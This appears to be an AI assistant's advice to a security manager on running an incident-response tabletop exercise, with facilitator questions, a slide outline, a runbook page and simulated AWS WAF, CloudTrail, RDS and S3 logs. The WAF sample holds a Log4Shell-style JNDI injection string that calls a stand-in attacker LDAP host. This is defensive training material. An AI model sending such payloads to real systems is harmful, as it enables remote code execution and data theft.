Do not get trapped in a 25-minute debate on one narrow technical point. This is about end-to-end response.

Keep bringing them back to roles and decisions

A tabletop is about who decides, who acts, who escalates, and who communicates.

⸻

What questions you should ask throughout

These are the core facilitator questions you should keep using.

Triage and incident declaration
	•	What do we know right now?
	•	What do we not know yet?
	•	Is this an event, vulnerability exposure, or confirmed incident?
	•	What is the current severity and why?
	•	Who has authority to declare the incident?

Ownership
	•	Who is leading this response?
	•	What is TVM responsible for here?
	•	What is AppSec responsible for here?
	•	What is Cloud Security responsible for here?
	•	What external teams must be engaged?

Investigation
	•	What evidence do we need first?
	•	Which systems/logs/tools would we use?
	•	Who has access today?
	•	What indicators would confirm or disprove compromise?
	•	How do we determine blast radius?

Containment
	•	What are our immediate options?
	•	Which option is lowest risk?
	•	Which option is fastest?
	•	What business impact does each containment path have?
	•	Who approves disruptive containment?

Escalation and communication
	•	Who needs to know now?
	•	What is the threshold for involving leadership?
	•	Do legal/privacy/compliance need to be engaged?
	•	What would your first executive update say?
	•	What should we avoid saying before facts are confirmed?

Recovery
	•	How do we know we are safe to restore or continue?
	•	What must be rotated, rebuilt, or revalidated?
	•	How do we avoid restoring compromised assets or code?
	•	What longer-term fixes are needed?

Lessons learned
	•	What failed: process, tooling, telemetry, access, training, or ownership?
	•	What one thing would have helped most?
	•	What should be fixed before the external tabletop?

⸻

How to tailor the exercise to your team structure

Because your team spans three security domains, you should intentionally test the handoffs and overlaps.

Threat & Vulnerability Management

This function should be tested on:
	•	vulnerability awareness and prioritization
	•	exposure validation
	•	asset identification
	•	patch urgency recommendations
	•	coordination with system owners
	•	risk-based prioritization when exploitation is suspected

Questions to press:
	•	How quickly can we identify affected assets?
	•	Do we know internet exposure?
	•	Can we distinguish installed vs exploitable?
	•	What SLAs or emergency patch expectations exist?

Application Security

This function should be tested on:
	•	exploitability analysis
	•	secure design implications
	•	code and dependency understanding
	•	app-layer mitigations
	•	WAF or rule tuning
	•	coordination with developers and product teams

Questions to press:
	•	Can AppSec confirm exploit path plausibility?
	•	What temporary mitigations exist short of a code fix?
	•	How do we engage developers quickly?
	•	What telemetry from the app layer do we depend on?

Cloud Security

This function should be tested on:
	•	IAM/token abuse analysis
	•	workload isolation
	•	logging/telemetry coverage
	•	cloud-native containment
	•	data access review
	•	persistence detection
	•	recovery integrity

Questions to press:
	•	Can we trace suspicious role/session activity?
	•	What logs are available by default?
	•	Can we isolate workloads without full outage?
	•	Who can revoke access or rotate secrets immediately?

The real value is in the seams between these teams.

⸻

Common mistakes first-time facilitators make

You should avoid these.

1. Making the scenario too big

Do not simulate an entire enterprise crisis with every possible complication. Keep it focused.

2. Turning it into a technical deep dive

This is not a troubleshooting call. It is a decision and coordination exercise.

3. Giving away the answer

Do not steer the team toward what you think is correct too early.

4. Letting the loudest person dominate

Draw quieter people in. Sometimes the people closest to process details speak less unless asked directly.

5. Not documenting gaps

If no one captures the issues, the session turns into theater.

6. Ending without remediation actions

A tabletop without follow-up actions is mostly performative.

⸻

What deliverables you should produce from the exercise

You should leave the session with four outputs.

1. Exercise summary

A short summary of:
	•	scenario used
	•	participants
	•	objectives
	•	major discussion themes

2. Findings and gaps log

Examples:
	•	unclear incident severity ownership
	•	no validated playbook for app-to-cloud compromise
	•	incomplete log access for cloud investigation
	•	no pre-defined executive update template
	•	unclear authority for production isolation
	•	secrets rotation process not timed or rehearsed

3. Action plan

Each issue should have:
	•	action description
	•	owner
	•	priority
	•	target date

4. External tabletop readiness notes

Capture:
	•	what needs to be corrected before the external session
	•	what talking points leadership should know
	•	where the team may still be weak

⸻

What your expectations should be as the manager

Go in with the right expectations.

You should expect:
	•	some confusion
	•	role overlap
	•	uncertainty around escalation thresholds
	•	assumptions that tools or access exist when they do not
	•	disagreement around containment decisions
	•	weak or inconsistent communication framing
	•	gaps in documentation or runbooks

That is normal.

What you should not expect:
	•	perfect answers
	•	fully synchronized thinking from all participants
	•	total procedural maturity on the first run

What you should expect from yourself:
	•	you keep structure
	•	you keep psychological safety
	•	you drive realism
	•	you capture evidence of where maturity needs to improve

⸻

Recommended simple agenda you can use

You can run your two-hour session like this:

1. Welcome and purpose — 10 min
Explain why you are doing this and the rules of engagement.

2. Roles and current-state assumptions — 10 min
Clarify perspectives in the room and what process baseline exists.

3. Scenario kickoff — 10 min
Introduce the opening situation.

4. Injects 1–3 — 30 min
Drive triage, incident declaration, investigation ownership.

5. Injects 4–5 — 25 min
Drive severity escalation, business impact, communications.

6. Injects 6–7 — 20 min
Drive persistence concerns, recovery thinking, corrective actions.

7. Debrief — 15 min
What worked, what did not, top lessons.

8. Assign action items — 10 min
Owners, priorities, dates.

⸻

A very practical way to present the scenario

Use slides or a simple document with one page per inject.

Each inject slide should contain:
	•	current timestamp in the scenario
	•	new facts introduced
	•	any stakeholder message or pressure
	•	the specific questions to answer

That structure keeps the session disciplined.

Example:

Inject 3 – 10:05 AM
CloudTrail shows unusual AssumeRole activity tied to the production application role from an IP range not normally associated with the application path. Secrets used by the application may have been exposed.

Discuss:
	•	Do we treat this as confirmed cloud compromise?
	•	What containment steps are immediate?
	•	Who leads cloud investigation?
	•	What business impact tradeoffs are involved?

That is exactly the level of operational detail you want.

⸻

What to say to your team at the beginning

You can open with something like this:

“Today’s session is an internal tabletop exercise to help us validate our readiness before the external tabletop. This is a discussion-based exercise, not a technical lab. The objective is to test how we think, coordinate, escalate, and make decisions under pressure. We are not here to judge individuals; we are here to identify strengths and gaps in our current operating model. I want everyone to answer from our real current-state capabilities, not from the process we wish we had.”

That framing usually lands well.

⸻

Final recommendation on scenario choice

For your team, I strongly recommend this scenario theme for the first session:

Critical internet-facing application vulnerability exploited, leading to suspected cloud credential misuse and potential data access.

It is the most natural fit for TVM + AppSec + Cloud Security together, and it will produce the richest discussion across prioritization, exploitability, cloud containment, business decision-making, and escalation.

⸻

What you should do next in practical order

Your next concrete steps should be:
	1.	define 4–6 exercise objectives
	2.	select the single scenario
	3.	identify participants and assign exercise roles
	4.	build 5–7 injects
	5.	prepare your facilitator guide
	6.	assign a scribe
	7.	send a short pre-read
	8.	run the two-hour session
	9.	document findings and action items
	10.	use those findings to prepare for the external tabletop

⸻

Good—this is the right next step. I’ll give you both artifacts in ready-to-use, enterprise-grade format:

⸻

📊 1. EXECUTIVE POWERPOINT SLIDE DECK (STRUCTURE + CONTENT)

This is designed for:
	•	your internal team session delivery
	•	reuse for leadership visibility
	•	alignment before the external tabletop

You can copy this directly into PowerPoint.

⸻

Slide 1 — Title Slide

Title:
Internal Security Tabletop Exercise

Subtitle:
Simulated Application Exploit & Cloud Compromise Scenario

Footer:
Threat Vulnerability Management | AppSec | Cloud Security

⸻

Slide 2 — Objective

Purpose
	•	Validate incident response readiness across TVM, AppSec, and Cloud Security
	•	Identify operational, technical, and coordination gaps
	•	Prepare for upcoming external tabletop exercise

Success Criteria
	•	Clear ownership and escalation paths
	•	Effective decision-making under pressure
	•	Identification of actionable improvements

⸻

Slide 3 — Scope

In Scope
	•	Incident detection and triage
	•	Vulnerability exploitation response
	•	Cloud compromise investigation
	•	Containment and escalation
	•	Executive communication

Out of Scope
	•	Deep forensic execution
	•	Legal/regulatory response execution
	•	Tool-specific troubleshooting

⸻

Slide 4 — Scenario Overview

Scenario Summary
	•	Critical RCE vulnerability in internet-facing application
	•	Exploitation suspected before patching
	•	Cloud IAM activity anomalies detected
	•	Potential data access in RDS and S3

Risk Themes
	•	Application compromise
	•	Credential/token misuse
	•	Data exposure risk
	•	Business disruption

⸻

Slide 5 — Roles & Responsibilities

Role	Responsibility
Incident Lead	Decision authority, coordination
TVM	Exposure validation, prioritization
AppSec	Exploitability, app-layer mitigation
Cloud Security	IAM, logs, containment
Scribe	Capture decisions & gaps


⸻

Slide 6 — Exercise Flow
	•	Scenario presented in phases (injects)
	•	Team responds in real time
	•	Decisions must reflect current capabilities
	•	Facilitator will challenge assumptions

⸻

Slide 7 — Inject 1: Initial Signal
	•	Unusual outbound traffic from EC2
	•	Critical RCE vulnerability announced

Discussion Focus
	•	Event vs Incident classification
	•	Initial ownership
	•	Required telemetry

⸻

Slide 8 — Inject 2: Exploitation Confirmed
	•	Vulnerable version confirmed in production
	•	Exploit attempts seen in logs

Focus
	•	Incident declaration
	•	Severity level
	•	Immediate containment options

⸻

Slide 9 — Inject 3: Cloud Activity
	•	Suspicious AssumeRole activity

Focus
	•	Blast radius
	•	IAM/token risk
	•	Cloud investigation approach

⸻

Slide 10 — Inject 4: Data Risk
	•	Abnormal RDS queries
	•	Suspicious S3 access

Focus
	•	Data exposure determination
	•	Escalation to leadership/legal

⸻

Slide 11 — Inject 5: Business Pressure
	•	App downtime impacts revenue
	•	Exec update required

Focus
	•	Risk vs business tradeoff
	•	Executive communication

⸻

Slide 12 — Inject 6: Persistence
	•	Possible IAM backdoor / artifact tampering

Focus
	•	Environment trust validation
	•	Recovery strategy

⸻

Slide 13 — Evaluation Criteria
	•	Incident recognition
	•	Role clarity
	•	Decision-making
	•	Escalation
	•	Communication
	•	Technical response

⸻

Slide 14 — Key Takeaways (TO FILL AFTER SESSION)
	•	Strengths observed
	•	Major gaps identified
	•	Immediate risks

⸻

Slide 15 — Next Steps
	•	Remediation actions
	•	Ownership assignments
	•	External tabletop readiness

⸻

⸻

📄 2. CONFLUENCE-READY RUNBOOK PAGE

This is structured exactly how security teams document operational exercises.

⸻

Page Title:

Internal Tabletop Exercise – Application Exploit & Cloud Compromise

⸻

1. Overview

This tabletop exercise simulates a multi-stage security incident involving:
	•	Exploitation of a critical application vulnerability
	•	Unauthorized cloud access via compromised credentials
	•	Potential data exposure in backend systems

The objective is to evaluate the organization’s readiness across Threat & Vulnerability Management, Application Security, and Cloud Security functions.

⸻

2. Objectives
	•	Validate incident detection and classification
	•	Assess cross-functional coordination
	•	Test containment and escalation decision-making
	•	Identify gaps in tooling, process, and ownership

⸻

3. Scenario Summary

A critical RCE vulnerability is disclosed affecting a production application. Indicators suggest exploitation occurred prior to patching, followed by suspicious IAM activity and abnormal access to backend data stores.

⸻

4. Participants & Roles

Role	Responsibility
Incident Lead	Overall coordination and decisions
TVM	Vulnerability exposure validation
AppSec	Exploitability analysis
Cloud Security	IAM and cloud investigation
Scribe	Documentation


⸻

5. Exercise Timeline (Inject-Based)

Phase 1: Initial Detection
	•	Alert: unusual outbound traffic
	•	CVE released

Expected Actions
	•	Triage ownership defined
	•	Initial severity discussion

⸻

Phase 2: Exploitation Confirmed
	•	Vulnerable system identified
	•	Exploit patterns detected

Expected Actions
	•	Incident declaration
	•	Containment planning

⸻

Phase 3: Cloud Impact
	•	Suspicious IAM activity

Expected Actions
	•	Cloud investigation initiated
	•	Credential risk mitigation

⸻

Phase 4: Data Risk
	•	Abnormal database and storage access

Expected Actions
	•	Data exposure assessment
	•	Escalation to stakeholders

⸻

Phase 5: Business Constraints
	•	Revenue impact concerns
	•	Executive involvement

Expected Actions
	•	Risk-based decision-making
	•	Executive communication

⸻

Phase 6: Persistence & Recovery
	•	Potential backdoor detected

Expected Actions
	•	Environment validation
	•	Recovery planning

⸻

6. Evaluation Criteria

Category	Description
Incident Recognition	Ability to classify correctly
Ownership	Clear role assignment
Investigation	Use of telemetry and tools
Containment	Effectiveness of actions
Escalation	Timeliness and accuracy
Communication	Clarity and appropriateness


⸻

7. Key Findings (Populate Post-Exercise)

Strengths
	•	[To be filled]

Gaps
	•	[To be filled]

⸻

8. Action Plan

Issue	Owner	Priority	Due Date
			


⸻

9. Lessons Learned
	•	Process improvements
	•	Tooling gaps
	•	Organizational alignment issues

⸻

10. External Tabletop Readiness
	•	Areas improved
	•	Remaining risks
	•	Leadership awareness points

⸻

🔥 Strategic Recommendation (Important)

For your level (Manager over 3 domains), you should:
	•	Run this internal tabletop once
	•	Fix top 3–5 critical gaps quickly
	•	Then brief leadership with:
	•	risks identified
	•	readiness level
	•	what could fail in real incident

That positions you strongly for the external tabletop.

⸻

If you want to go even further (highly recommended)

Next I can build:

1. Realistic log artifacts
	•	CloudTrail (AssumeRole anomaly)
	•	WAF logs (exploit attempts)
	•	RDS query logs
	•	S3 access logs

👉 makes the exercise feel real, not theoretical

2. SOC Playbook aligned to this scenario
	•	Step-by-step detection → response → containment
	•	Mapped to Splunk/Sentinel

3. Executive briefing pack
	•	What to tell CISO after exercise
	•	Risk heatmap
	•	Maturity scoring

⸻

Understood—this is where your tabletop goes from “discussion” to realistic operational simulation.

Below are production-grade, realistic log artifacts you can inject into the exercise at the right phases. These are intentionally structured to resemble what your team would see in CloudTrail, WAF, RDS, and S3 logs so you can force hands-on analytical thinking.

⸻

🔐 HOW TO USE THESE LOGS IN YOUR TABLETOP

You will introduce these logs during specific injects:

Inject	Log Type
Inject 2	WAF Logs (Exploit Evidence)
Inject 3	CloudTrail (IAM Abuse)
Inject 4	RDS Logs (Data Access)
Inject 4	S3 Logs (Data Exfil Pattern)

Do NOT give all logs at once. Introduce them progressively.

⸻

1. 🌐 WAF LOGS — Exploit Attempt (Inject 2)

📄 Sample Log (Simplified AWS WAF JSON)

{
  "timestamp": 1710852301123,
  "formatVersion": 1,
  "webaclId": "arn:aws:wafv2:us-east-1:123456789012:regional/webacl/prod-app-waf",
  "terminatingRuleId": "Default_Action",
  "action": "ALLOW",
  "httpSourceName": "ALB",
  "httpSourceId": "app/prod-alb",
  "ruleGroupList": [],
  "httpRequest": {
    "clientIp": "185.193.88.45",
    "country": "RU",
    "uri": "/api/v1/process",
    "args": "input=${jndi:ldap://malicious-server.com/a}",
    "httpMethod": "POST",
    "headers": [
      {"name": "User-Agent", "value": "curl/7.68.0"},
      {"name": "Content-Type", "value": "application/json"}
    ]
  }
}


⸻

🎯 What This Represents
	•	Classic RCE injection pattern (Log4Shell-style)
	•	Traffic allowed → WAF not blocking
	•	External attacker IP
	•	Exploit payload in request parameters

⸻

❗ What You Should Force the Team to Answer
	•	Did WAF fail or was rule missing?
	•	Do we have detection vs prevention?
	•	Can AppSec confirm exploitability?
	•	Do we block IP, deploy rule, or isolate app?

⸻

🔍 Advanced Push
	•	“Do we have WAF logging enabled across all ALBs?”
	•	“Do we baseline normal request patterns?”
	•	“Would this trigger any SIEM alert today?”

⸻

⸻

2. 🔐 CLOUDTRAIL LOG — IAM Abuse (Inject 3)

📄 Sample Log

{
  "eventVersion": "1.08",
  "userIdentity": {
    "type": "AssumedRole",
    "principalId": "AROA123EXAMPLE:app-server",
    "arn": "arn:aws:sts::123456789012:assumed-role/prod-app-role/app-server",
    "accountId": "123456789012"
  },
  "eventTime": "2026-03-19T15:12:45Z",
  "eventSource": "sts.amazonaws.com",
  "eventName": "AssumeRole",
  "awsRegion": "us-east-1",
  "sourceIPAddress": "185.193.88.45",
  "userAgent": "aws-cli/2.13",
  "requestParameters": {
    "roleArn": "arn:aws:iam::123456789012:role/prod-app-role"
  },
  "responseElements": {
    "credentials": {
      "accessKeyId": "ASIA...EXAMPLE"
    }
  }
}


⸻

🎯 What This Represents
	•	App role assumed from external attacker IP
	•	Indicates:
	•	credential theft OR
	•	SSRF/token exposure

⸻

❗ What You Should Force
	•	Is this confirmed compromise?
	•	How do we:
	•	revoke sessions?
	•	rotate credentials?
	•	What logs confirm lateral movement?

⸻

🔍 Advanced Push
	•	“Do we detect abnormal geo/IP usage for roles?”
	•	“Do we have GuardDuty / detections for this?”
	•	“What’s our time to revoke compromised credentials?”

⸻

⸻

3. 🗄️ RDS LOG — Data Access (Inject 4)

📄 Sample Log (PostgreSQL-style)

2026-03-19 15:14:22 UTC [24567] user=app_user db=prod_db LOG:  statement: 
SELECT * FROM customers LIMIT 1000;

2026-03-19 15:14:24 UTC [24567] user=app_user db=prod_db LOG: 
SELECT * FROM payment_info;

2026-03-19 15:14:30 UTC [24567] user=app_user db=prod_db LOG:
COPY (SELECT * FROM customers) TO STDOUT;


⸻

🎯 What This Represents
	•	Large data queries
	•	Possible bulk extraction behavior
	•	Not typical app behavior (depending on baseline)

⸻

❗ Force the Team
	•	Is this normal app behavior?
	•	How do you confirm exfiltration vs legitimate use?
	•	Do we have query baselining?

⸻

🔍 Advanced Push
	•	“Do we log ALL queries or only errors?”
	•	“Can we tie DB activity to IAM/session identity?”
	•	“What data classification exists for these tables?”

⸻

⸻

4. 📦 S3 ACCESS LOG — Data Exfil (Inject 4)

📄 Sample Log

79a59df900b949e55d96a1e698f0ee 123456789012 prod-data-bucket 
[19/Mar/2026:15:16:45 +0000] 
185.193.88.45 arn:aws:sts::123456789012:assumed-role/prod-app-role/app-server 
REST.GET.OBJECT sensitive/customer_export.csv 
"GET /prod-data-bucket/customer_export.csv HTTP/1.1" 200 - 5242880 12 10 "-" "aws-cli/2.13"


⸻

🎯 What This Represents
	•	Data accessed from:
	•	assumed role (same as compromised one)
	•	external IP
	•	Large object download

⸻

❗ Force Questions
	•	Is this confirmed data exfiltration?
	•	What logs confirm download vs access?
	•	How do we determine scope?

⸻

🔍 Advanced Push
	•	“Do we have S3 object-level logging enabled everywhere?”
	•	“Do we alert on large downloads?”
	•	“Can we identify all accessed objects quickly?”

⸻

⸻

🧠 HOW TO TURN THIS INTO A HIGH-IMPACT EXERCISE

When you present these logs, do NOT explain them

Instead say:

“Here are the logs your team has access to right now. What do you do?”

⸻

Force operational thinking:

Instead of:
“We would investigate this”

Push:
	•	“Who runs this query?”
	•	“What tool do you use?”
	•	“How long would this take in real life?”

⸻

🔥 WHAT YOU ARE ACTUALLY TESTING WITH THESE LOGS

Area	What You’re Validating
TVM	Can they connect CVE → exploitation reality
AppSec	Can they validate exploit pattern
Cloud Sec	Can they trace IAM abuse
Detection	Do logs even exist / are usable
IR Maturity	Can team correlate across layers


⸻

⚠️ CRITICAL OBSERVATION YOU SHOULD LOOK FOR

During the exercise, watch for this:

🚩 Common Failure Pattern
	•	Team treats logs in isolation
	•	No correlation across:
	•	WAF → CloudTrail → RDS → S3

✅ What Good Looks Like
	•	“Exploit → credential abuse → data access → exfil chain”

That’s the maturity signal.

⸻

🚀 If You Want to Go Even More Advanced

Next level (what elite teams do):

I can build you:

🔹 1. Full attack timeline correlation
	•	Step-by-step attacker kill chain
	•	mapped to MITRE ATT&CK

🔹 2. Splunk / Sentinel queries
	•	ready-to-run detection queries
	•	correlation rules

🔹 3. SOC Playbook (Gold standard)
	•	detection → triage → containment
	•	mapped to your tools

🔹 4. Executive breach simulation layer
	•	inject PR/legal pressure
	•	simulate board-level escalation

⸻

If you want, I strongly recommend next we build:

👉 SOC Playbook + Detection Queries tied to these exact logs

That’s what will make your tabletop stand out at a leadership level.

